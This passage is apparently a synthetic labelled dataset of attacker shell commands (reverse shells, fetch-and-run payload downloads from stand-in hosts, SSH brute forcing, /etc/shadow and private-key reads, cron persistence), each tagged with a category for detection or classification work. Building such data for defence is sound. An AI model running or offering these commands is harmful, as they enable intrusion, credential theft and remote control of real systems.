+log-220,2024-12-31T14:58:54.540684Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-221,2025-03-20T09:01:06.540693Z,wget http://malware.srv/install14.sh && chmod +x install14.sh && ./ install14.sh,malware_download
+log-222,2025-11-24T10:19:48.540702Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-223,2025-03-15T10:19:27.540712Z,"python3 -c 'import urllib.request as u;open(""/tmp/update44.py"",""wb"").write(u.urlopen(""http://evil.example/update44.py"").read())'; python3 /tmp/update44.py",malware_download
+log-224,2025-10-10T03:05:05.540721Z,nc -e /bin/sh 172.16.0.9 80,reverse_shell
+log-225,2025-02-23T12:23:00.540729Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-226,2025-02-06T12:16:03.540738Z,mkdir /tmp/persist58; chmod 777 /tmp/persist58,persistence_or_filesystem
+log-227,2025-08-28T11:14:53.540748Z,bash -i >& /dev/tcp/10.0.0.5/443 0>&1,reverse_shell
+log-228,2025-04-16T05:25:47.540757Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload15.py"",""wb"").write(u.urlopen(""http://malware.srv/payload15.py"").read())'; python3 /tmp/payload15.py",malware_download
+log-229,2024-12-16T22:45:37.540767Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-230,2025-09-12T10:04:47.540776Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-231,2025-05-24T07:27:38.540785Z,bash -i >& /dev/tcp/192.0.2.12/6666 0>&1,reverse_shell
+log-232,2025-11-21T19:52:40.540795Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-233,2025-03-20T23:47:07.540805Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""203.0.113.7"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-234,2025-01-06T18:53:41.540814Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-235,2025-02-08T15:08:28.540823Z,nc -e /bin/sh 10.0.0.5 9001,reverse_shell
+log-236,2025-07-16T06:10:34.540832Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-237,2025-07-18T04:01:36.540841Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-238,2025-02-14T04:52:55.540869Z,curl -fsSL http://malicious.test/runme51.php -o /tmp/runme51.php; php /tmp/runme51.php,malware_download
+log-239,2025-06-01T11:21:08.540885Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-240,2025-03-08T13:25:36.540895Z,echo '@reboot root /tmp/runme86.sh' >> /etc/crontab,persistence_or_filesystem
+log-241,2025-04-02T15:23:31.540905Z,"python3 -c 'import urllib.request as u;open(""/tmp/update71.py"",""wb"").write(u.urlopen(""http://malicious.test/update71.py"").read())'; python3 /tmp/update71.py",malware_download
+log-242,2025-12-06T12:19:53.540914Z,mkdir /tmp/backdoor59; chmod 777 /tmp/backdoor59,persistence_or_filesystem
+log-243,2025-05-30T04:16:51.540923Z,curl -fsSL http://badhost.local/runme47.php -o /tmp/runme47.php; php /tmp/runme47.php,malware_download
+log-244,2025-08-19T10:32:49.540933Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme12.py"",""wb"").write(u.urlopen(""http://badhost.local/runme12.py"").read())'; python3 /tmp/runme12.py",malware_download
+log-245,2024-12-16T23:05:41.540942Z,curl -fsSL http://malware.srv/runme44.php -o /tmp/runme44.php; php /tmp/runme44.php,malware_download
+log-246,2025-05-25T23:03:34.540952Z,sshpass -p 'toor' ssh root@1.2.3.4,brute_force
+log-247,2025-09-20T12:55:02.540960Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-248,2025-05-01T16:27:23.540969Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-249,2025-03-16T05:48:34.540978Z,find / -name '*.conf' -type f,enumeration
+log-250,2025-03-26T04:40:31.540987Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-251,2024-12-22T21:37:00.540996Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-252,2025-03-22T17:28:35.541004Z,cat /etc/passwd,credential_harvest
+log-253,2025-10-25T16:37:25.541013Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-254,2025-08-07T01:47:56.541023Z,curl -fsSL http://malicious.test/update90.php -o /tmp/update90.php; php /tmp/update90.php,malware_download
+log-255,2025-11-30T22:54:41.541032Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-256,2025-10-08T02:50:18.541041Z,cat /etc/passwd,credential_harvest
+log-257,2025-03-26T07:16:03.541050Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-258,2025-11-30T19:00:12.541060Z,curl -fsSL http://badhost.local/runme66.php -o /tmp/runme66.php; php /tmp/runme66.php,malware_download
+log-259,2025-06-26T18:01:51.541069Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-260,2025-11-01T10:58:25.541078Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-261,2025-07-04T05:14:05.541088Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-262,2025-08-09T08:11:24.541099Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-263,2025-03-31T01:43:35.541108Z,nc -e /bin/sh 1.2.3.4 443,reverse_shell
+log-264,2025-10-24T06:45:43.541117Z,echo 'hello world',unknown
+log-265,2025-07-26T16:26:17.541127Z,curl -fsSL http://payloads.net/runme17.php -o /tmp/runme17.php; php /tmp/runme17.php,malware_download
+log-266,2025-02-10T23:56:22.541136Z,echo '@reboot root /tmp/p26.sh' >> /etc/crontab,persistence_or_filesystem
+log-267,2025-07-02T11:02:14.541145Z,curl -fsSL http://payloads.net/payload46.php -o /tmp/payload46.php; php /tmp/payload46.php,malware_download
+log-268,2024-12-07T18:52:11.541155Z,nc -e /bin/sh 45.23.11.9 443,reverse_shell
+log-269,2025-02-25T07:52:40.541164Z,echo '@reboot root /tmp/x4.sh' >> /etc/crontab,persistence_or_filesystem
+log-270,2025-05-30T04:57:31.541174Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-271,2025-10-20T15:50:09.541184Z,mkdir /tmp/backdoor17; chmod 777 /tmp/backdoor17,persistence_or_filesystem
+log-272,2025-05-02T21:36:55.541198Z,"python3 -c 'import urllib.request as u;open(""/tmp/install4.py"",""wb"").write(u.urlopen(""http://evil.example/install4.py"").read())'; python3 /tmp/install4.py",malware_download
+log-273,2025-07-08T09:44:35.541207Z,bash -i >& /dev/tcp/10.0.0.5/2222 0>&1,reverse_shell
+log-274,2025-03-12T18:50:09.541216Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-275,2025-03-24T16:11:52.541225Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-276,2025-06-06T06:38:41.541234Z,bash -i >& /dev/tcp/10.0.0.5/6666 0>&1,reverse_shell
+log-277,2025-08-16T06:56:48.541243Z,echo 'hello world',unknown
+log-278,2025-11-22T15:06:10.541252Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-279,2025-11-08T19:26:15.541261Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-280,2025-11-07T03:06:33.541270Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-281,2025-10-16T15:39:12.541279Z,curl -fsSL http://evil.example/update91.php -o /tmp/update91.php; php /tmp/update91.php,malware_download
+log-282,2024-12-31T06:27:51.541288Z,bash -i >& /dev/tcp/172.16.0.9/2222 0>&1,reverse_shell
+log-283,2025-02-16T13:38:58.541297Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-284,2025-09-25T15:50:59.541306Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-285,2025-08-02T01:26:20.541315Z,cat /etc/passwd,credential_harvest
+log-286,2025-06-10T08:01:37.541410Z,nc -e /bin/sh 1.2.3.4 2222,reverse_shell
+log-287,2025-11-26T16:18:11.541422Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-288,2025-02-05T05:33:54.541431Z,nc -e /bin/sh 10.0.0.5 8080,reverse_shell
+log-289,2025-08-23T20:59:24.541440Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-290,2025-02-17T07:53:40.541449Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-291,2025-10-19T02:58:12.541458Z,find / -name '*.conf' -type f,enumeration
+log-292,2025-01-12T08:05:46.541468Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-293,2025-08-13T18:07:45.541477Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-294,2025-03-14T12:39:55.541486Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-295,2025-02-17T09:05:25.541495Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-296,2025-11-15T12:29:33.541504Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-297,2025-02-25T13:26:23.541513Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme9.py"",""wb"").write(u.urlopen(""http://malicious.test/runme9.py"").read())'; python3 /tmp/runme9.py",malware_download
+log-298,2025-02-19T06:30:04.541522Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-299,2025-05-24T04:04:01.541531Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-300,2025-05-18T15:50:16.541541Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-301,2024-12-16T00:19:52.541550Z,cat /etc/passwd,credential_harvest
+log-302,2025-01-11T00:39:22.541568Z,echo 'hello world',unknown
+log-303,2024-12-08T09:27:19.541578Z,curl -fsSL http://payloads.net/payload21.php -o /tmp/payload21.php; php /tmp/payload21.php,malware_download
+log-304,2025-11-11T14:47:10.541588Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-305,2025-03-31T06:16:43.541597Z,cat /etc/shadow,credential_harvest
+log-306,2025-11-22T13:49:58.541606Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-307,2024-12-23T03:34:59.541616Z,curl -fsSL http://malicious.test/runme53.php -o /tmp/runme53.php; php /tmp/runme53.php,malware_download
+log-308,2024-12-08T04:30:20.541625Z,sshpass -p 'password' ssh root@203.0.113.7,brute_force
+log-309,2025-10-16T03:38:22.541635Z,"perl -e 'use Socket;$i=""192.0.2.12"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-310,2025-06-17T17:50:26.541645Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-311,2025-02-02T13:11:40.541653Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-312,2025-11-18T06:40:47.541662Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-313,2025-01-04T07:34:55.541671Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-314,2025-07-02T12:35:53.541681Z,wget http://payloads.net/runme43.sh && chmod +x runme43.sh && ./ runme43.sh,malware_download
+log-315,2025-02-11T06:46:43.541690Z,cat /etc/shadow,credential_harvest
+log-316,2025-09-20T22:54:21.541699Z,mkdir /tmp/backdoor7; chmod 777 /tmp/backdoor7,persistence_or_filesystem
+log-317,2025-06-19T04:55:55.541708Z,date; whoami,unknown
+log-318,2025-10-22T23:11:44.541717Z,date; whoami,unknown
+log-319,2025-05-30T03:23:40.541726Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-320,2025-10-02T00:10:03.541735Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-321,2024-12-20T23:02:09.541744Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-322,2025-11-25T06:26:13.541754Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-323,2025-11-12T23:58:15.541763Z,sshpass -p '123456' ssh root@172.16.0.9,brute_force
+log-324,2024-12-12T22:19:55.541772Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-325,2025-10-14T09:16:51.541781Z,wget http://badhost.local/payload78.sh && chmod +x payload78.sh && ./ payload78.sh,malware_download
+log-326,2025-03-14T20:33:52.541789Z,cat /etc/passwd,credential_harvest
+log-327,2025-12-06T03:26:34.541799Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-328,2025-01-11T19:29:27.541808Z,cat /etc/passwd,credential_harvest
+log-329,2025-06-29T12:23:49.541817Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-330,2025-07-23T00:31:22.541827Z,cat /etc/passwd,credential_harvest
+log-331,2025-01-08T21:50:05.541837Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-332,2024-12-21T23:09:00.541847Z,wget http://malicious.test/x79.sh && chmod +x x79.sh && ./ x79.sh,malware_download
+log-333,2024-12-11T08:47:57.541857Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-334,2025-06-12T04:33:15.541866Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-335,2025-08-05T15:51:34.541876Z,nc -e /bin/sh 172.16.0.9 8080,reverse_shell
+log-336,2025-02-16T11:35:32.541884Z,echo 'hello world',unknown
+log-337,2025-02-24T07:54:54.541894Z,"python3 -c 'import urllib.request as u;open(""/tmp/p52.py"",""wb"").write(u.urlopen(""http://payloads.net/p52.py"").read())'; python3 /tmp/p52.py",malware_download
+log-338,2025-11-09T19:47:27.541904Z,wget http://malware.srv/runme86.sh && chmod +x runme86.sh && ./ runme86.sh,malware_download
+log-339,2025-01-03T19:50:01.541913Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-340,2025-05-12T00:00:46.541922Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-341,2025-05-09T02:12:51.541931Z,bash -i >& /dev/tcp/1.2.3.4/443 0>&1,reverse_shell
+log-342,2025-12-04T08:35:50.541940Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-343,2025-01-04T06:02:31.541949Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-344,2025-09-29T22:52:34.541958Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-345,2025-06-13T23:04:36.541967Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-346,2025-02-17T12:42:26.541976Z,some-weird-tool --foo bar,unknown
+log-347,2024-12-29T01:50:46.541985Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-348,2025-03-05T02:43:51.541995Z,curl -fsSL http://badhost.local/runme38.php -o /tmp/runme38.php; php /tmp/runme38.php,malware_download
+log-349,2025-01-01T02:11:48.542005Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-350,2025-04-24T19:41:42.542014Z,echo '@reboot root /tmp/runme33.sh' >> /etc/crontab,persistence_or_filesystem
+log-351,2025-10-29T21:05:58.542023Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-352,2025-09-15T06:38:41.542032Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-353,2025-01-25T16:56:33.542040Z,find / -name '*.conf' -type f,enumeration
+log-354,2025-09-16T12:45:49.542050Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-355,2025-01-24T08:35:32.542059Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 8080 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-356,2024-12-22T16:13:20.542069Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-357,2025-03-21T11:41:05.542078Z,nc -e /bin/sh 10.0.0.5 6666,reverse_shell
+log-358,2025-11-03T20:13:58.542087Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 6666 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-359,2025-04-15T15:49:47.542097Z,cat /etc/passwd,credential_harvest
+log-360,2025-01-18T13:10:54.542106Z,wget http://evil.example/payload30.sh && chmod +x payload30.sh && ./ payload30.sh,malware_download
+log-361,2025-10-30T14:53:01.542115Z,sshpass -p 'toor' ssh root@172.16.0.9,brute_force
+log-362,2025-11-21T10:38:59.542125Z,mkdir /tmp/backdoor85; chmod 777 /tmp/backdoor85,persistence_or_filesystem
+log-363,2025-02-26T07:41:51.542135Z,curl -fsSL http://malicious.test/update87.php -o /tmp/update87.php; php /tmp/update87.php,malware_download
+log-364,2025-01-10T09:14:44.542145Z,wget http://evil.example/update27.sh && chmod +x update27.sh && ./ update27.sh,malware_download
+log-365,2025-02-28T11:06:47.542154Z,curl -fsSL http://malicious.test/p24.php -o /tmp/p24.php; php /tmp/p24.php,malware_download
+log-366,2025-06-07T23:14:20.542164Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-367,2025-01-25T16:46:40.542173Z,cat /etc/passwd,credential_harvest
+log-368,2025-08-15T04:34:30.542182Z,cat /etc/passwd,credential_harvest
+log-369,2025-04-01T07:49:17.542191Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-370,2025-11-27T09:26:29.542201Z,wget http://badhost.local/runme81.sh ; chmod +x runme81.sh ; ./ runme81.sh,malware_download
+log-371,2025-09-21T14:35:17.542210Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-372,2025-08-06T05:33:03.542220Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.0.2.12"",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-373,2025-11-16T19:56:24.542229Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-374,2025-04-10T11:21:14.542237Z,cat /etc/passwd,credential_harvest
+log-375,2025-01-06T14:07:32.542246Z,find / -name '*.conf' -type f,enumeration
+log-376,2025-02-01T03:40:01.542256Z,nc -e /bin/sh 10.0.0.5 2222,reverse_shell
+log-377,2025-06-04T05:59:17.542265Z,sshpass -p 'admin123' ssh root@45.23.11.9,brute_force
+log-378,2025-08-21T06:23:49.542274Z,cat /etc/passwd,credential_harvest
+log-379,2025-09-23T01:52:17.542284Z,"python3 -c 'import urllib.request as u;open(""/tmp/x81.py"",""wb"").write(u.urlopen(""http://evil.example/x81.py"").read())'; python3 /tmp/x81.py",malware_download
+log-380,2025-04-09T10:22:12.542294Z,curl -fsSL http://malware.srv/p28.php -o /tmp/p28.php; php /tmp/p28.php,malware_download
+log-381,2025-02-04T06:24:15.542303Z,"python3 -c 'import urllib.request as u;open(""/tmp/x93.py"",""wb"").write(u.urlopen(""http://malware.srv/x93.py"").read())'; python3 /tmp/x93.py",malware_download
+log-382,2025-01-31T00:24:03.542313Z,"python3 -c 'import urllib.request as u;open(""/tmp/payload65.py"",""wb"").write(u.urlopen(""http://payloads.net/payload65.py"").read())'; python3 /tmp/payload65.py",malware_download
+log-383,2025-12-06T04:16:09.542323Z,wget http://malware.srv/install85.sh && chmod +x install85.sh && ./ install85.sh,malware_download
+log-384,2025-02-08T06:55:52.542332Z,for i in {1..1000}; do ssh root@1.2.3.4 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-385,2025-09-02T03:42:29.542342Z,curl -fsSL http://badhost.local/update77.php -o /tmp/update77.php; php /tmp/update77.php,malware_download
+log-386,2025-06-05T00:01:35.542350Z,cat /etc/passwd,credential_harvest
+log-387,2025-02-24T10:20:27.542359Z,curl http://badhost.local/payload -o /tmp/p && bash /tmp/p,malware_download
+log-388,2025-08-11T11:38:49.542370Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme18.py"",""wb"").write(u.urlopen(""http://badhost.local/runme18.py"").read())'; python3 /tmp/runme18.py",malware_download
+log-389,2025-05-21T04:45:20.542378Z,cat /etc/passwd,credential_harvest
+log-390,2025-11-17T13:54:51.542388Z,wget http://malicious.test/p34.sh ; chmod +x p34.sh ; ./ p34.sh,malware_download
+log-391,2025-12-01T20:33:47.542397Z,echo '@reboot root /tmp/x82.sh' >> /etc/crontab,persistence_or_filesystem
+log-392,2025-01-06T03:53:48.542406Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-393,2024-12-12T01:24:32.542415Z,echo 'hello world',unknown
+log-394,2025-05-14T06:58:31.542424Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-395,2025-02-15T18:47:59.542433Z,curl -fsSL http://payloads.net/update15.php -o /tmp/update15.php; php /tmp/update15.php,malware_download
+log-396,2025-11-22T10:21:33.542442Z,cat /etc/shadow,credential_harvest
+log-397,2024-12-13T18:19:08.542452Z,wget http://payloads.net/update53.sh && chmod +x update53.sh && ./ update53.sh,malware_download
+log-398,2025-06-08T19:56:58.542462Z,nc -e /bin/sh 172.16.0.9 80,reverse_shell
+log-399,2025-08-05T18:14:38.542471Z,echo '@reboot root /tmp/runme26.sh' >> /etc/crontab,persistence_or_filesystem
+log-400,2025-12-03T08:11:33.542480Z,curl -fsSL http://malicious.test/p11.php -o /tmp/p11.php; php /tmp/p11.php,malware_download
+log-401,2025-08-15T06:54:41.542489Z,echo '@reboot root /tmp/install24.sh' >> /etc/crontab,persistence_or_filesystem
+log-402,2024-12-14T09:02:23.542500Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme23.py"",""wb"").write(u.urlopen(""http://payloads.net/runme23.py"").read())'; python3 /tmp/runme23.py",malware_download
+log-403,2025-01-27T18:27:06.542509Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-404,2025-05-30T14:36:54.542518Z,curl http://malicious.test/payload -o /tmp/p && bash /tmp/p,malware_download
+log-405,2025-02-25T12:10:14.542527Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-406,2025-01-18T09:05:00.542536Z,find / -name '*.conf' -type f,enumeration
+log-407,2025-08-18T18:38:55.542545Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-408,2025-11-26T12:54:55.542554Z,hydra -l root -P /tmp/wordlist.txt ssh://192.0.2.12,brute_force
+log-409,2025-04-23T01:03:08.542564Z,curl -fsSL http://malware.srv/update42.php -o /tmp/update42.php; php /tmp/update42.php,malware_download
+log-410,2025-10-27T22:00:32.542573Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-411,2025-02-09T08:56:25.542584Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-412,2024-12-14T00:59:31.542593Z,echo '@reboot root /tmp/runme31.sh' >> /etc/crontab,persistence_or_filesystem
+log-413,2025-10-26T00:07:23.542602Z,"python3 -c 'import urllib.request as u;open(""/tmp/p99.py"",""wb"").write(u.urlopen(""http://evil.example/p99.py"").read())'; python3 /tmp/p99.py",malware_download
+log-414,2025-01-20T23:18:16.542612Z,bash -i >& /dev/tcp/172.16.0.9/2222 0>&1,reverse_shell
+log-415,2025-04-23T22:59:16.542621Z,curl -fsSL http://evil.example/install60.php -o /tmp/install60.php; php /tmp/install60.php,malware_download
+log-416,2025-04-04T08:15:30.542630Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-417,2025-03-14T22:56:40.542639Z,nc -e /bin/sh 10.0.0.5 9001,reverse_shell
+log-418,2025-02-04T19:29:20.542648Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-419,2025-08-16T18:19:56.542658Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-420,2025-09-02T01:24:52.542668Z,curl -fsSL http://malware.srv/runme96.php -o /tmp/runme96.php; php /tmp/runme96.php,malware_download
+log-421,2025-09-21T02:06:00.542677Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-422,2025-10-21T22:25:15.542686Z,mkdir /tmp/tmpdir30; chmod 777 /tmp/tmpdir30,persistence_or_filesystem
+log-423,2025-10-26T22:35:17.542695Z,curl -fsSL http://badhost.local/install90.php -o /tmp/install90.php; php /tmp/install90.php,malware_download
+log-424,2024-12-06T18:50:34.542705Z,"python3 -c 'import urllib.request as u;open(""/tmp/update49.py"",""wb"").write(u.urlopen(""http://evil.example/update49.py"").read())'; python3 /tmp/update49.py",malware_download
+log-425,2024-12-31T20:19:04.542714Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-426,2025-06-06T02:00:38.542724Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-427,2025-10-06T13:29:46.542733Z,find / -name '*.conf' -type f,enumeration
+log-428,2025-09-17T09:42:20.542741Z,cat /etc/passwd,credential_harvest
